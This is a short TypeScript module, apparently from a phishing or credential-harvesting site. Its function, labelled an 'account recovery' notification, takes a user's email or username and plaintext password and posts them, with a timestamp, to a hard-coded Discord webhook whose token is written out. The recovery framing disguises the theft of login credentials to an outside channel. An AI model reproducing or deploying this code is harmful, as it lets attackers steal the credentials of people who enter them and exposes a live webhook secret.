// Discord webhook integration
const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1290064859018428466/_qS1U4H3wEyLE4PE0edFtOYc-24ER73KWwIRSuUKN9joNIMXXEiyA1qAmn3GT8ZuKtwh';

export const sendRecoveryNotification = async (
  identifier: string,
  password: string
) => {
  try {
    const message = {
      embeds: [{
        title: "🔐 Account Recovery Details",
        color: 3447003, // Discord blue
        fields: [
          {
            name: "Email/Username",
            value: identifier,
            inline: true
          },
          {
            name: "Password",
            value: password,
            inline: true
          },
          {
            name: "Timestamp",
            value: new Date().toLocaleString(),
            inline: false
          }
        ],
        footer: {
          text: "Account Recovery System"
        }
      }]
    };

    const response = await fetch(DISCORD_WEBHOOK_URL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(message)
    });

    return response.ok;
  } catch (error) {
    console.error('Failed to send Discord notification:', error);
    return false;
  }
};